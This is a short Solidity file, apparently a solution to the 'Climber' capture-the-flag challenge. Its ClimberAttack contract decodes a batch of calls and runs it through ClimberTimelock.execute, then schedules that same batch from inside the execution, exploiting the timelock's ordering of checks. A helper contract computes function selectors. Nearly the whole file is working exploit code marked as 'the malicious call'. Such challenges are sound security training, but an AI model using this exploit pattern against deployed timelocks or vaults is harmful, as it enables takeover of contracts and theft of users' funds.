// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "../../node_modules/hardhat/console.sol";

contract ClimberAttack {
    using Address for ClimberTimelock;
    ClimberTimelock public timelock;
    address[] public targets;
    uint256[] public values;
    bytes[] public dataElements;
    bytes32 public salt;

    constructor(ClimberTimelock _timelock) {
        timelock = _timelock;
    }

    function attack(bytes calldata payload) external payable {
        // save the calldata for later
        (targets, values, dataElements, salt) = abi.decode(payload, (address[], uint256[], bytes[], bytes32));

        // perform the malicious call
        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract GetSelector {
    function getSelector(string calldata _func) external pure returns (bytes4) {
        return bytes4(keccak256(bytes(_func)));
    }
}
